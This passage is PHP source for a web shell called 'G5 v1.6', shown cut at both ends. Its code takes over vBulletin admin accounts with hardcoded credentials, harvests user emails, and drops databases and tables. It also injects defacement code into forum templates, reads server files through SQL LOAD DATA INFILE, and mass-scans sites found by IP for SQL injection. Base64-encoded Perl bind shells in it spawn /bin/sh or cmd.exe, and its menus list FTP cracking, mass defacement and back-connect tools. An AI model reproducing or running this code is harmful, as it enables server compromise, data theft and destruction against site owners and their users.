echo ">MSSQL</option>
<option valut=Oracle onClick='document.client.sqlserv.disabled = true;' ";
if ($_REQUEST['sqlty']=='Oracle')echo 'selected';
echo ">Oracle</option>
<option valut=PostgreSQL onClick='document.client.sqlserv.disabled = false;' ";
if ($_REQUEST['sqlty']=='PostgreSQL')echo 'selected';
echo ">PostgreSQL</option>
<option valut=DB2 onClick='document.client.sqlserv.disabled = false;' ";
if ($_REQUEST['sqlty']=='DB2')echo 'selected';
echo ">IBM DB2</option></select>";

inp('text','19','sqdbn',$n);
inp('text','19','sqlog',$u);
inp('text','18','sqpwd',$p);
inp('text','15','sqsrv','localhost');
inp('text','15','sqprt','3306');
sub('sqlwxp','SQL Explorer');

are('sqquery',("SHOW DATABASES"),'100','5','<br>');
sub('sqconf','Run SQL Query');
echo "<select name=sqldp>
<option value=SQL>SQL</option>
<option value=GZIP>GZIP</option>";
sub('dumd','&nbsp;Dump','<br>');
echo "&nbsp;&nbsp;";
inp('text','75','cfils',path,'');sub('gfils','&nbsp;Get file','<br>');
echo "</div>";}

function vbsql()
{
echo "<form action=\"".$php."\" method=\"post\">
<div align =\"center\"><b>VB Opreators (VB Only)</b>";
echo '<div align=left>';

echo "<b>DataBase options</b><br>";
$n = 'mysql';
$u = 'User Name';
$p = 'Password';
if(!empty($_POST['tab1'])){$t = $tb;}
if(!empty($_POST['sqdbn'])){$n = $db;}
if(!empty($_POST['sqlog'])){$u = $user;}
if(!empty($_POST['sqpwd'])){$p = $pass;}


echo "<br>";
inp('radio','10','vbss','vbca','Change Admin','<br>');
inp('radio','10','vbss','vbgm','GET maillist','<br>');
inp('radio','10','vbss','vbrb','Remove Courent DB');
inp('radio','10','vbss','vbro','Remove Other DB'); inp('text','15','odb',$n,'','<br>');
inp('radio','10','vbss','vbrt','Remove Table',':::::-------:::::');inp('text','15','tab1',$t,'TABLE Name:');
echo "<br>";echo "<br>";
inp('text','19','sqdbn',$n);
inp('text','19','sqlog',$u);
inp('text','18','sqpwd',$p);

inp('text','15','sqsrv','localhost');
inp('text','15','sqprt','3306');
echo "<br><br><div align =\"center\">";
sub('vbsq','DO IT!','<br>');
echo "</form><br><br>";
echo "<a href=\"".$php."\">Home</a>";
 echo "<p align=\"center\"><a href=\"javascript: history.go(-1)\">Back</a></p>"; ft(); die;}

function rs($anm ,$col,$row,$st='')
{if(isset($_REQUEST["gfil"]) || isset($_REQUEST['gfils'])|| isset($_REQUEST['show'])){$rdo = '';}else $rdo = 'readonly';

    $rs = "<textarea name=\"".$anm."\" cols=\"".$col."\" rows=\"".$row."\" $rdo>";
echo $rs;}
function inp($ty,$sz,$nm,$vu,$ti='',$pr='')
{if($ty == 'radio' || $ty == 'checkbox'){$tit = $ti;
 $tt = '&nbsp;'.$tit.'&nbsp;';unset($ti);}
$inp = "$ti<input type=".$ty." name=".$nm." ";if($sz != 0) { $inp .= "size=".$sz." "; }$inp .= "value=\"".$vu."\">$tt".$pr."";echo $inp;}
function sub($cnm,$cvu,$pr='')
{$sub = "<input type=\"submit\" value=\"".$cvu."\" name=\"".$cnm."\" />$pr";echo $sub;}
function are($anm,$avu,$col,$row,$pr ='')
{$are = "<br><textarea name=\"".$anm."\" cols=\"".$col."\" rows=\"".$row."\" $sr>".$avu."</textarea><br>";echo $are;}

function sl()
{$selhk =  "
<form name=\"site\" action=\"".$php."\"method=\"post\"><select size=\"1\" name=\"fsOP\" title=\"FileS Action\" >
<option>Select</option>
<option value=\"cmdr\">Commander</option>
<option value=\"frc\">File Explorer</option>
<option value=\"seaa\">Search</option><option value=\"ftm\">Cpanel + FTP Cracker</option><option value=\"fts\">Mass Index</option><option value=\"cry\">Crypt</option><option value=\"fbk\">Eval PHP</option><option value=\"fcf\">Htaccess Option</option><option value=\"mil\">Mailer</option><option value=\"fsf\">Zone-H</option></select><input type=\"submit\" name=\"allss\" value=\"GO\" /><select size=\"1\" name=\"dbOP\" title=\"DBaseS Action\" ><option>Select</option><option value=\"dau\">phpMyAdmin</option><option value=\"dmi\">vBulletin®</option><option value=\"ddu\">Back Connect</option><option value=\"ddr\">Users</option><option value=\"dml\">SQL Injction</option><option value=\"dqu\">Port Scan</option>
<option value=\"etr\">Extract Remote Site</option></select>

<input type=\"submit\" name=\"allqw\" value=\"GO\" /></form>";
echo $selhk; }

function icod()
{echo "<form action=\"".$php."\" method=\"post\">
<div align =\"center\"><b>Upload File";
are('code','Post your code here','50','20','<br>');
inp('text','40','upf',path,'File Name');echo "<br>";
sub('upff','upload','<br>');
echo "<a href=\"javascript: history.go(-1)\">Back</a></div>";}

function wdll_bdx($colr)
{echo "<div align=\"center\">
<table width=\"70%\" bgcolor=\"".$colr."\" border=\"1\" bordercolor=\"#D78989\" bordercolordark=\"#440606\" bordercolorlight=\"#EEE1E1\" datapagesize=\"10\" name=\"aaa\" title=\"Easy Come Easy GO\"><tr><td>";}

function wdll_bdy()
{echo "</td></tr></table></div>";}
function wdll_repxl(){echo ("<table width=\"70%\"  bgcolor=black cellspacing=\"1\" cellpadding=\"1\">\n<tr><th>Dir and Files</th><th>Type</th><th>Mode</th><th>Size</th></th><th>Last modified</th><th>Action</th>\n");}

function wdll_repxt($file){$siz = wdll_s1z(@filesize($file));$perm = substr(decoct(@fileperms($file)), -3, 3);
echo "<tr><td class=tdx><a href=\"".$php."?dir=".@base64_encode(@realpath($file))."\">".$file."</a></td><td class=tdx>DIR</td><td  class=tdx><font color =\"".wdll_permc($file)."\">".$perm."</font></td><td class=tdx><font color =ffffff>".$siz."</font></td><td class=tdx><font color =orange>".@date ("Y/m/d, H:i:s", @filemtime($file))."</font></td><td class=tdx>...</td>";}

function wdll_repxtr($file){
    $xtr = @pathinfo($file);$extt = $xtr["extension"];$siz = wdll_s1z(@filesize($file));$perm = substr(decoct(@fileperms($file)), -3, 3);
    echo "<tr><td class=tdx><a href=\"".$php."?show=".@base64_encode(@realpath($file))."\">".$file."</a></td><td class=tdx>".$extt."</td><td class=tdx><font color =\"".wdll_permc($file)."\">".$perm."</font></td><td class=tdx><font color =gold>".$siz."</font></td><td class=tdx><font color =orange>".@date ("Y/m/d, H:i:s", @filemtime($file))."</font></td><td class=tdx><a target=\"_blank\"href=\"".$php."?action=".@base64_encode(urlencode(@realpath($file))). "\">Action</a></td>";}

function head($col4)
{
    $x5 = "<style type=\"text/css\">* { margin: 0; padding: 0; }TD { FONT-SIZE: 8pt; COLOR: #993333; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #993333; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}input{background-color: #993333; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: black; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #993333; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: $col4;}.trx ,{BORDER-RIGHT:red 1px solid;BORDER-LEFT: red 1px solid;BORDER-BOTTOM: green 1px solid;}.tdx {BORDER-RIGHT:red 1px solid;BORDER-LEFT:green 1px solid;BORDER-BOTTOM: red 1px solid;}A:link {COLOR:gold;TEXT-DECORATION: none}A:visited { COLOR:green; TEXT-DECORATION: none}A:active {COLOR:red; TEXT-DECORATION: none}A:hover {color:ffffff;TEXT-DECORATION: none}</style>";
    
    $x4 = "<style type='text/css'>* { margin: 0; padding: 0; }* { margin: 0; padding: 0; }
body {background:#000 url(img/background-body-repeat.png) repeat-y top center;color:#fff;font-size:11px;font-family:'Lucida Grande', 'Lucida Sans', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;text-shadow:#000 0 1px 0;}
input {-moz-border-radius:5px;border:0;color:#CCC;background:url(http://lh5.ggpht.com/_Kwwy9VyLMKw/S9nq5_g05bI/AAAAAAAAC_s/CiExZz5uY0Y/background-container.png) no-repeat scroll left top transparent;padding:3px;}
body,table { font-family:verdana;font-size:11px;color:silver;background-color:$col4; }table { width:100%; }table,td { border:1px solid #808080;margin-top:2;margin-bottom:2;padding:5px; }a { color:lightblue;text-decoration:none; }a:active { color:#00FF00; }a:link { color:#5B5BFF; }a:hover { text-decoration:underline; }a:visited { color:#99CCFF; }input,select,option { font:8pt tahoma;color:#ffffff;margin:2;border:1px solid #666666; }textarea { color:#dedbde;font:fixedsys bold;border:1px solid #666666;margin:2; }.fleft { float:left;text-align:left; }.fright { float:right;text-align:right; }#pagebar { font:10pt tahoma;padding:5px; border:3px solid #1E1E1E; border-collapse:collapse; }#pagebar td { vertical-align:top; }#pagebar p { font:8pt tahoma;}#pagebar a { font-weight:bold;color:#00FF00; }#pagebar a:visited { color:#00CE00; }#mainmenu { text-align:center; }#mainmenu a { text-align: center;padding: 0px 5px 0px 5px; }#maininfo,.barheader,.barheader2 { text-align:center; }#maininfo td { padding:3px; }.barheader { font-weight:bold;padding:5px; }.barheader2 { padding:5px;border:2px solid #1F1F1F; }.contents,.explorer { border-collapse:collapse;}.contents td { vertical-align:top; }.mainpanel { border-collapse:collapse;padding:5px; }.barheader,.mainpanel table,td { border:1px solid #333333; }.mainpanel input,select,option { border:1px solid #333333;margin:0; }input[type='submit'] { border:1px solid #000000; } input[type='text'] { padding:3px;}.shell { background-color:#C0C0C0;color:#000080;padding:5px; }.fxerrmsg { color:red; font-weight:bold; }#pagebar,#pagebar p,h1,h2,h3,h4,form { margin:0; }#pagebar,.mainpanel,input[type='submit'] { background-color:#4A4A4A; }.barheader2,input,select,option,input[type='submit']:hover { background-color:#333333; }textarea,.mainpanel input,select,option { background:#000 url(http://lh3.ggpht.com/_Kwwy9VyLMKw/S9nq5h6budI/AAAAAAAAC_o/JnTYblUixFc/background-body-repeat.png) repeat-y top center;color:#fff;font-size:12px;text-shadow:#000 0 1px 0; }</style>";

   if(style == 'x5') {$style = $x5;}
    elseif(style == 'x4'){$style = $x4;}
echo "<head><title>G5</title>
<div style=\"background: red;\"><p align=\"center\">
<font size=\"3\" color =\"orange\"><b>G5 v1.6</font></b></p><hr color=\"black\"</div></div><center>";
echo $style;
echo "</head>";}



function check_url($url,$source){ //Thanks Lagripe-Dz 
if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$source))  {
echo "[+] Found -> ".$url."\n";
}
else{ echo "[~] Not Found -> ".$url."\n"; }
}

function check_sql_inj($site){
	$result = @file_get_contents("$site%27");
	check_url($site,$result);}

function mystripos($haystack, $needle){
return strpos($haystack, stristr( $haystack, $needle ));}
	
function sec($ent)
{$bb = str_replace("http://", "", $ent);
$cc = str_replace("www.", "", $bb);
$dd = substr($cc, 0, mystripos($cc, "/"));
return $dd;
}


function ft()
{ echo "<br><br><br><div style=\"background: brown;\"><p align=\"center\">

<font size=\"2\" color =\"ffffff\"><b>w.dll@live.com 2011 | <a target=_blank href='http://piaster.blogspot.com'>Site</a></b></font></p></div></div>";}

function wdll_rep($dir, $path, $file)
{
$lf = @filemtime($dir);
$time = @date("d/m/Y", $lf);
$xtr = @pathinfo($file);
$extt = $xtr["extension"];
$siz = wdll_s1z(@filesize($dir));
$perm = substr(decoct(@fileperms($dir)), -3, 3);
$webpath = @getenv("SERVER_NAME");
$fullp = $webpath.'/'.$dir;
echo ("<tr><td class=tdx><font color = gold><a href=\"".$php."?dir=".@base64_encode(@realpath($path))."\">".$path."</a></font></td><td class=tdx><font color =\"orange\"><a href=\"".$php."?show=".@base64_encode($dir)."\">".$file."</a></font></a></td><td class=tdx><font color = gold>$extt</font></td><td class=tdx><font color =orange>$siz</font></td><td class=tdx><center><font color =gray>" .
@date("d/m/Y", @filectime($dir)) . "</font></td><td class=tdx><center><font color =red>" . @date("d/m/Y",
@filemtime($dir)) . "</font></td><td class=tdx><center><font color =gold>$perm</font></td><td class=tdx><center><a target=\"_blank\" href='$fullp'>view</td><td class=tdx><center><font color =red><center><a target=\"_blank\"href=\"" .
$php . "?action=" . urlencode(@base64_encode($dir)) . "\">Action</a></font></td>");}

function wdll_repx()
{echo ("<table bgcolor=black width=\"70%\" cellspacing=\"1\" cellpadding=\"1\">\n<tr><th>Dir</th><th>Filename</th><th>Type</th><th>Size</th><th>Inode</th><th>Modify</th></th><th>Mode</th><th>link</th><th>Action</th>\n");}

function vb_opt()
{ global $log,$db;
$tbl= $_POST['tab1'];
$odbs= $_POST['odb'];
if (!$log){echo 'Could not connect: ' . @mysql_error();}
echo "Login DB Done\n...";
switch ($_REQUEST["vbss"]){
case 'vbca': { $vb_wdl = 'UPDATE '.$db.'.user SET username = "wdll",password = "691fed95cba5e31004e7072abd5e98db",salt = "fdd" WHERE user.userid =1 LIMIT 1 ';
 $qry = @mysql_query($vb_wdl,$log);
if ($qry)
{ echo "Runing Work ...\n"; } if(@@mysql_affected_rows($log) != 1)
{echo "Done \nUser Name:  wdll \nPassword:   nora\n..... Enjoy.";} 
} break; 
case 'vbgm': { $vb_wdl = 'SELECT * FROM user ;';
    $qry = @mysql_query($vb_wdl , $log);
echo'<table border="0" bgcolor="black"><th>ID</th><th>User</th><th>E-mail</th>';
while ($row = @mysql_fetch_array($qry))
{echo'<tr><td>' . $row['userid'] . '</td><td>' . $row['username'] . '</td><td>' . $row['email'] . '</td></tr>';}
echo "</table><table border=\"1\" bgcolor=\"800000\"><th>
Total : [".@mysql_num_rows($qry)."]</th></table><br>";
@mysql_free_result($qry);
@mysql_close($log);} break; 
    case 'vbro': { $vb_wdl = 'DROP DATABASE '.$odbs.'';
     $qry = @mysql_query($vb_wdl ,$log);if($qry) {echo "WORK! Done :).... <br> DATABASE '$odbs' GONE AWAY ^_^";}else {echo '..... Nothing To DO ...*_*';@mysql_close($log);}
    } break; 
    case 'vbrb': { $vb_wdl = 'DROP DATABASE '.$db.'';
     $qry = @mysql_query($vb_wdl, $log);if($qry) {echo "WORK! Done :).... <br> DATABASE '$db' GONE AWAY ^_^";}else {echo '.....Nope ... *_*';@mysql_close($log);}
    } break; 
    case 'vbrt': { $vb_wdl = 'DROP TABLE '.$tbl.' ';
     $qry = @mysql_query($vb_wdl , $log);if($qry) {echo "WORK! Done :).... <br> TABLE '$tbl' GONE AWAY ^_^";}else {echo '.....Nope ... *_*';@mysql_close($log);}} break; }
echo "<br><a href=\"javascript: history.go(-1)\">Back</a></div>";  }

function sqlj_do($ip){ // Thanks Lagripe-Dz 

$npages = 500000;
$npage = 1;
$allLinks = array();

		
  while($npage <= $npages) 
  { 
	$ch = curl_init();                     
	curl_setopt($ch, CURLOPT_URL, 'http://www.bing.com/search?q=ip%3A' . $ip . '+id=&first=' . $npage);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	curl_setopt($ch, CURLOPT_REFERER, 'http://www.bing.com/');
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
	$result['EXE'] = curl_exec($ch);
	$result['ERR'] = curl_error($ch);
	curl_close($ch);
 
	if ( empty( $result['ERR'] ) )
	{preg_match_all('(<div class="sb_tlst">.*<h3>.*<a href="(.*)".*>(.*)</a>.*</h3>.*</div>)siU', $result['EXE'], $findlink);
		for ($i = 0; $i < count($findlink[1]); $i++)
		array_push($allLinks,$findlink[1][$i]);
		$npage = $npage + 10;
		if (preg_match('(first=' . $npage . '&amp)siU', $result['EXE'], $linksuiv) == 0) break;}
    else break;}

$allDmns = array();
	foreach ($allLinks as $kk => $vv){
	$allDmns[] = $vv;
	}
	$resultPages = array_unique($allDmns);
	sort($resultPages) ;
	

for ($x = 0; $x < count($resultPages); $x++){
$h3h3 = $resultPages[$x];
check_sql_inj($h3h3);
}

echo "\nINFO / IP : ".$ip." / Total Domain Scaned : ".count($resultPages)."\nFINISHED ";}

//------------------------------------Thanx Itsec Team |ADAPTED|-------------------------------------------

function sqlexp(){
global $log;
if(!empty($_REQUEST['sqsrv']) && !empty($_REQUEST['sqlog']) && isset($_REQUEST['sqpwd']) && !empty($_REQUEST['sqquery']))
{$sqlserv=$_REQUEST['sqsrv'];$sqlty=$_REQUEST['sqlty'];$pass=$_REQUEST['sqpwd'];$user=$_REQUEST['sqlog'];$query=$_REQUEST['sqquery'];
$db=(empty($_REQUEST['sqdbn']))?'':$_REQUEST['sqdbn'];
$_SESSION[sqlserv]=$_REQUEST['sqsrv'];$_SESSION[sqlty]=$_REQUEST['sqlty'];$_SESSION[qpwd]=$_REQUEST['sqpwd'];$_SESSION[userr]=$user;}

if (isset ($_GET['select_db'])){$getdb=$_GET['select_db'];$_SESSION[db]=$getdb;$query="SHOW TABLES";$res=sqlqu($_SESSION[sqlty],$_SESSION[sqlserv],$_SESSION[userr],$_SESSION[qpwd],$_SESSION[db],$query);}
elseif (isset ($_GET[select_tbl])){$tbl=$_GET[select_tbl];$_SESSION[tbl]=$tbl;
$query="SELECT * FROM `$tbl`";$res=sqlqu($_SESSION[sqlty],$_SESSION[sqlserv],$_SESSION[userr],$_SESSION[qpwd],$_SESSION[db],$query);}
elseif (isset ($_GET[drop_db])){
$getdb=$_GET[drop_db];$_SESSION[db]=$getdb;$query="DROP DATABASE `$getdb`";
sqlqu($_SESSION[sqlty],$_SESSION[sqlserv],$_SESSION[userr],$_SESSION[qpwd],'',$query);
$res=sqlqu($_SESSION[sqlty],$_SESSION[sqlserv],$_SESSION[userr],$_SESSION[qpwd],'','SHOW DATABASES');}
elseif (isset ($_GET[drop_tbl])){$getbl=$_GET[drop_tbl];$query="DROP TABLE `$getbl`";
sqlqu($_SESSION[sqlty],$_SESSION[sqlserv],$_SESSION[userr],$_SESSION[qpwd],$_SESSION[db],$query);
$res=sqlqu($_SESSION[sqlty],$_SESSION[sqlserv],$_SESSION[userr],$_SESSION[qpwd],$_SESSION[db],'SHOW TABLES');}
elseif (isset ($_GET[drop_row])){$getrow=$_GET[drop_row];$getclm=$_GET[clm];$query="DELETE FROM `$_SESSION[tbl]` WHERE $getclm='$getrow'";$tbl=$_SESSION[tbl];
sqlqu($_SESSION[sqlty],$_SESSION[sqlserv],$_SESSION[userr],$_SESSION[qpwd],$_SESSION[db],$query);
$res=sqlqu($_SESSION[sqlty],$_SESSION[sqlserv],$_SESSION[userr],$_SESSION[qpwd],$_SESSION[db],"SELECT * FROM `$tbl`");}
else$res=sqlqu($sqlty,$sqlserv,$user,$pass,$db,$query);
if($res){$res=htmlspecialchars($res);$row=array ();$title=explode('*',$res);$trow=explode('-',$title[1]);$row=explode('-+',$title[0]);$data=array();$field=$trow[count($trow)-2];
if (strstr($trow[0],'Database')!='')$obj='db';
elseif (substr($trow[0],0,6)=='Tables')
$obj='tbl';else$obj='row';$i=0;foreach ($row as $a){if($a!='')$data[$i++]=explode('+',$a);}

echo "<table border=1 bordercolor='brown' cellpadding='2' bgcolor='silver' width='100%' style='border-collapse: collapse'><tr>";
foreach ($trow as $ti)echo "<td bgcolor='brown'>$ti</td>";echo "</tr>";$j=0;
while ($data[$j]){echo "<tr>";foreach ($data[$j++] as $dr){echo "<td>";if($obj!='row') echo "<a href='$php?do=db&select_$obj=$dr'>";echo $dr;if($obj!='row') echo "</a>";echo "</td>";}echo "<td><a href='$php?do=db&drop_$obj=$dr";
if($obj=='row')echo "&clm=$field";echo "'>Drop</a></td></tr>";}echo "</table><br>";}}

function sqlqu($sqlty,$host,$user,$pass,$db='',$query){
$res='';
switch($sqlty){
case 'MySQL':
if(!function_exists('mysql_connect'))return 0;
$link=@mysql_connect($host,$user,$pass);
if($link){
if(!empty($db))@mysql_select_db($db,$link);
$result=@mysql_query($query,$link);
if ($result!=1){
while($data=@mysql_fetch_row($result))$res.=implode('+',$data).'-+';
$res.='*';
for($i=0;$i<@mysql_num_fields($result);$i++)
$res.=@mysql_field_name($result,$i).'-';}
@mysql_close($link);
return $res;}break;
case 'MSSQL':
if(!function_exists('mssql_connect'))return 0;
$link=@mssql_connect($host,$user,$pass);
if($link){
if(!empty($db))@mssql_select_db($db,$link);
$result=@mssql_query($query,$link);
while($data=@mssql_fetch_row($result))$res.=implode('+',$data).'-+';
$res.='*';
for($i=0;$i<@mssql_num_fields($result);$i++)
$res.=@mssql_field_name($result,$i).'-';
@mssql_close($link);
return $res;
}
break;
case 'Oracle':
if(!function_exists('ocilogon'))return 0;
$link=@ocilogon($user,$pass,$db);
if($link){
$stm=@ociparse($link,$query);
@ociexecute($stm,OCI_DEFAULT);
while($data=@ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('+',$data).'-+';
$res.='*';
for($i=0;$i<oci_num_fields($stm);$i++)
$res.=@oci_field_name($stm,$i).'-';
return $res;
}
break;
case 'PostgreSQL':
if(!function_exists('pg_connect'))return 0;
$link=@pg_connect("host=$host dbname=$db user=$user password=$pass");
if($link){
$result=@pg_query($link,$query);
while($data=@pg_fetch_row($result))$res.=implode('+',$data).'-+';
$res.='*';
for($i=0;$i<@pg_num_fields($result);$i++)
$res.=@pg_field_name($result,$i).'-';
@pg_close($link);
return $res;
}
break;
case 'DB2':
if(!function_exists('db2_connect'))return 0;
$link=@db2_connect($db,$user,$pass);
if($link){
$result=@db2_exec($link,$query);
while($data=@db2_fetch_row($result))$res.=implode('+',$data).'-+';
$res.='*';
for($i=0;$i<@db2_num_fields($result);$i++)
$res.=@db2_field_name($result,$i).'-';
@db2_close($link);
return $res;
}
break;
}
return 0;
}
//------------------------------------END  Itsec Team -------------------------------------------

function wdll_dbc()
{
global $log;
if($log){ $querys = @explode(';',sql_query);  foreach($querys as $num=>$query)   { if(strlen($query)>5){ echo "<br>Query# ::<font face=Verdana size=-2 color=green><b>".$num." : ".htmlspecialchars($query)."</b></font><br>";
$qry = @mysql_query($query,$log); $error = @mysql_error($log); if($error) { 
    echo "<table  width=50% bgcolor=black ><tr class=trx><td class=tdx><font face=Verdana size=-2>Error : <b>".$error."</b></font></td></tr></table><br>"; }
else {if (@mysql_num_rows($qry) > 0)  { $sql2 = $sql = $keys = $values = ''; while (($row = @mysql_fetch_assoc($qry))) { $keys = @implode("&nbsp;</b></font></td><td class=tdx bgcolor=red><font face=Verdana size=-2><b>&nbsp;", @array_keys($row));
$values = @array_values($row); foreach($values as $k=>$v) { $values[$k] = htmlspecialchars($v);}
$values = @implode("&nbsp;</font></td><td class=tdx><font face=Verdana size=-2>&nbsp;",$values);
$sql2 .= "<tr class=trx><td class=tdx><font face=Verdana size=-2>&nbsp;".$values."&nbsp;</font></td></tr>";
} echo "<table width=100%>";$sql  = "<tr class=trx><td class=tdx bgcolor=orange><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";$sql .= $sql2;echo $sql;echo "</table><br>";if(($rows = @mysql_affected_rows($log))>=0) { echo "<table width=100%><tr class=trx><td class=tdx><font face=Verdana size=-2>affected rows : <b>".$rows."</b></font></td></tr></table><br>"; }}else { if(($rows = @mysql_affected_rows($log))>=0) { echo "<table width=100% bgcolor=black ><tr class=trx><td class=tdx><font face=Verdana size=-2>affected rows : <b>".$rows."</b></font></td></tr></table><br>"; } }}@mysql_free_result($qry);}} @mysql_close($log);} else echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to MySQL server</b></font></div>";}

function db_mass($coded,$msi)
{global $db,$log;
if (!$log){echo 'Could not connect:' . @mysql_error($log);}else
echo "Login DB Done ^_*<br>";
$other = stripcslashes($_POST['msqur']); 
$wdll ='';
switch($msi){
case('msvb'):{ 
$wdll ='UPDATE '.$db.'.template SET template = \''.$coded.'\' WHERE title = "FORUMHOME"'; 
$wdlll = 'UPDATE '.$db.'.template SET template =\''.$coded.'\' WHERE title ="spacer_open"'; }break;//VB
case('msbb'):{}break;
case('msin'):{}break;
case('mswp'):{}break;
case('msjo'):{}break;
case('msrd'):{$wdll = 'DROP DATABASE '.$db.'';}break;
case('msot'):{$wdll = $other;}break;}
$qry = @mysql_query($wdll, $log);if($qry) {echo "WORK! Done<br>";}
if($msi = 'msvb'){
$qry = @mysql_query($wdlll , $log);}
if($qry){echo "<br>L00K ...<a href = 'http://" . $_SERVER['HTTP_HOST'] . "'target= _balnk>http://" . $_SERVER['HTTP_HOST'] . "</a>  Enjoy...^_^";
}@mysql_close($log); 
unset($wdll);
echo "<br><br><a href=\"javascript: history.go(-1)\">Back</a>";}

function sqlf($filehd)
    { global $log ;
if (!$log){echo 'Could not connect: ' . @mysql_error($log);} 
$qrt =  'CREATE TABLE `wdll` ('. ' `wdll` LONGBLOB NOT NULL'. ' );'; 
$qry = "LOAD DATA INFILE \"".$filehd."\" INTO TABLE wdll";
$qrf = "SELECT * FROM wdll;";
$qrd = "DROP TABLE wdll;";
      @mysql_query($qrt , $log);
      @mysql_query($qry, $log);
      $rs= @mysql_query($qrf, $log);
      if (!$rs) {echo "\nError in reading file (permision denied)!\n";}
      else
      {$file = "";
       while ($row = @mysql_fetch_array($rs, MYSQL_ASSOC)) 
       {$file .= @join ("\r\n",$row);}
       if (empty($file)) 
       {echo "\nFile \"".$filehd."\" does not exists or empty!\n";}
       else 
       {echo $file;}
       @mysql_free_result($rs);
       @mysql_query($qrd, $log);}}

function bbc($bo ,$ip ='' ){
   
if($_REQUEST['lbg'])
{$lbpi="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7JHBvcnQ9JEFSR1ZbMF07JHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTskY21kPSJscGQiOyQwPSRjbWQ7c29ja2V0KFNFUlZFUiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90byk7c2V0c29ja29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JFVVNFQUREUiwgcGFjaygibCIsIDEpKTtiaW5kKFNFUlZFUiwgc29ja2FkZHJfaW4oJHBvcnQsIElOQUREUl9BTlkpKTtsaXN0ZW4oU0VSVkVSLCBTT01BWENPTk4pO2Zvcig7ICRwYWRkciA9IGFjY2VwdChDTElFTlQsIFNFUlZFUik7IGNsb3NlIENMSUVOVCl7b3BlbihTVERJTiwgIj4mQ0xJRU5UIik7b3BlbihTVERPVVQsICI+JkNMSUVOVCIpO29wZW4oU1RERVJSLCAiPiZDTElFTlQiKTtzeXN0ZW0oJy9iaW4vc2gnKTtjbG9zZShTVERJTik7Y2xvc2UoU1RET1VUKTtjbG9zZShTVERFUlIpO30g";
$op=@fopen("lbg.pl","w");
@fwrite($op,@base64_decode($lbpi));
@fclose($op);
if(wdll_chf()) {wdll_cmdf("perl lbg.pl $bo");echo "<br>connected to $bo ";echo "<script type='text/javascript'>alert('connected to $bo')</script>";} else die("<br>I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode $bo");}
if($_REQUEST['wbp'])
{$wbpi="dXNlIFNvY2tldDsKJHBvcnQJPSAkQVJHVlswXTsKJHByb3RvCT0gZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpOwpzb2NrZXQoU0VSVkVSLCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKTsKc2V0c29ja29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JFVVNFQUREUiwgcGFjaygibCIsIDEpKTsKYmluZChTRVJWRVIsIHNvY2thZGRyX2luKCRwb3J0LCBJTkFERFJfQU5ZKSk7Cmxpc3RlbihTRVJWRVIsIFNPTUFYQ09OTik7CmZvcig7ICRwYWRkciA9IGFjY2VwdChDTElFTlQsIFNFUlZFUik7IGNsb3NlIENMSUVOVCkKewpvcGVuKFNURElOLCAiPiZDTElFTlQiKTsKb3BlbihTVERPVVQsICI+JkNMSUVOVCIpOwpvcGVuKFNUREVSUiwgIj4mQ0xJRU5UIik7CnN5c3RlbSgnY21kLmV4ZScpOwpjbG9zZShTVERJTik7CmNsb3NlKFNURE9VVCk7CmNsb3NlKFNUREVSUik7Cn0g";
$op=@fopen("wbg.pl","w");
@fwrite($op,@base64_decode($wbp));
@fclose($op);
if(wdll_chf()) {wdll_cmdf("perl wbg.pl $bo"); echo "<br>connected to $bo";echo "<script type='text/javascript'>alert('connected to $bo')</script>";} else die("<br>I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode $bo");}
if($_REQUEST['bpg'] )
